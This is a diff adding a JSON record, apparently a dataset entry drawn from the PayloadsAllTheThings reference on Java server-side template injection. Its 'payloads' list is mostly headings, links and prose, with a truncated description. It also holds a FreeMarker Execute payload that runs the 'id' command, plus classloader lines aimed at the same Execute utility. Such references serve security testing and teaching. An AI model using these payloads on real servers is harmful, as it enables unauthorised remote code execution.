@@ -1,0 +1,27 @@
+{
+  "id": "rce-be3f03007b2c",
+  "category": "RCE",
+  "title": "Java",
+  "description": "# Server Side Template Injection - Java\n\n> Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n- [Java EL](#ja",
+  "payloads": [
+    "- [Groovy - HTTP Request:](#groovy---http-request)",
+    "> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.",
+    "[Official website](https://freemarker.apache.org/)",
+    "You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)",
+    "- Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)",
+    "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}",
+    "FreeMarker offers the built-in function: `lower_abc`. This function converts int-based values into alphabetic strings, but not in the way you might expect from functions such as `chr` in Python, as the [documentation for lower_abc explains](https://freemarker.apache.org/docs/ref_builtins_number.html#ref_builtin_lower_abc):",
+    "Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).",
+    "<#assign classloader=article.class.protectionDomain.classLoader>",
+    "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>",
+    "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>",
+    "<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>",
+    "[Official website](https://github.com/HubSpot/jinjava)",
+    "{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206",
+    "Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Server Side Template Injection/Java.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
